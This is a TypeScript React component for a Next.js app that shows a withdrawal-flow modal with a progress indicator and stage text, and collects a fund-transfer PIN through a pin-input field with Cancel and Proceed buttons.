"use client";

import React from "react";
import Image from "next/image";
import FlowModal from "@/components/modals/flow/flowModal";
import { Button } from "@/components/ui/button";
import { PinInput, PinInputGroup, PinInputInput } from "@/components/ui/pin-input";
import { getStageContent } from "@/lib/constants/withdrawal";
import type { WithdrawalRequest } from "@/lib/types/api";

interface FundTransferPinModalProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  onSubmit?: (code: string) => void;
  onCancel?: () => void;
  request: WithdrawalRequest;
  isLoading?: boolean;
  trigger?: React.ReactNode;
}

const FundTransferPinModal = ({ 
  open, 
  onOpenChange, 
  onSubmit, 
  onCancel, 
  request,
  isLoading = false,
  trigger
}: FundTransferPinModalProps) => {
  const [pinValue, setPinValue] = React.useState<string[]>([]);
  
  const stageContent = getStageContent("fund_transfer_pin", {
    amount: request.amount,
    percent: request.percent,
    showPercent: request.show_percent,
    message: request.message,
  });

  // Use code_length from request, fallback to stageContent
  const codeLength = request.code_length && request.code_length > 0 ? request.code_length : stageContent.codeLength;
  const codeString = pinValue.join("");
  const isValidCode = codeString.length === codeLength;

  const handleSubmit = () => {
    if (isValidCode) {
      onSubmit?.(codeString);
    }
  };

  const handleCancel = () => {
    onCancel?.();
    onOpenChange(false);
  };

  React.useEffect(() => {
    if (!open) {
      setPinValue([]);
    }
  }, [open]);

  return (
    <FlowModal
      trigger={trigger}
      open={open}
      onOpenChange={(next) => {
        if (!next) {
          setPinValue([]);
          handleCancel();
        }
        onOpenChange?.(next);
      }}
      eyebrow={stageContent.eyebrow}
      title={stageContent.title}
      subtitle={stageContent.subtitle}
      contentClassName="max-w-lg"
      dialogClassName="sm:max-w-lg"
    >
      <div className="space-y-6">
        <div className="flex flex-col items-center gap-3 text-center">
          <Image src="/loading.gif" alt="Loading" width={180} height={180} className="h-32 w-32" />
          {typeof request.percent === 'number' && request.show_percent !== false && (
            <div className="text-sm font-medium text-blue-700 dark:text-blue-300">
              {request.percent}%
            </div>
          )}
          {isLoading && (
            <p className="text-sm font-medium text-gray-600 dark:text-gray-300">
              {stageContent.processingMessage}
            </p>
          )}
        </div>

        <div className="space-y-3 text-left">
          {stageContent.description && (
            <p className="text-sm leading-relaxed text-gray-600 dark:text-gray-300">
              {stageContent.description}
            </p>
          )}
          {stageContent.note && (
            <p className="text-xs text-gray-500 dark:text-gray-400">{stageContent.note}</p>
          )}
        </div>

        <div className="space-y-3">
          <div>
            <p className="text-[11px] uppercase tracking-[0.4em] text-gray-500 dark:text-gray-400">
              {stageContent.codeLabel}
            </p>
          </div>
          <PinInput
            value={pinValue}
            onValueChange={(details) => setPinValue(details.value)}
            otp
            blurOnComplete
          >
            <PinInputGroup className="gap-2 justify-center">
              {Array.from({ length: codeLength }).map((_, index) => (
                <PinInputInput
                  key={`fund-pin-digit-${index}`}
                  index={index}
                  className="w-12 h-12 text-lg font-bold text-center border-2 rounded-lg bg-white dark:bg-gray-900 border-gray-300 dark:border-gray-600 focus:border-indigo-500 focus:ring-2 focus:ring-indigo-200 dark:focus:ring-indigo-900/20 transition-all"
                />
              ))}
            </PinInputGroup>
          </PinInput>
        </div>

        <div className="flex items-center justify-between gap-3">
          <Button
            type="button"
            variant="outline"
            className="cursor-pointer border border-gray-300 text-gray-700 hover:bg-gray-50 dark:border-white/10 dark:text-white"
            onClick={handleCancel}
            disabled={isLoading}
          >
            Cancel
          </Button>
          <Button
            type="button"
            className="cursor-pointer bg-indigo-600 text-white hover:bg-indigo-500"
            onClick={handleSubmit}
            disabled={!isValidCode || isLoading}
          >
            {isLoading ? "Processing..." : "Proceed"}
          </Button>
        </div>
      </div>
    </FlowModal>
  );
};

export default FundTransferPinModal;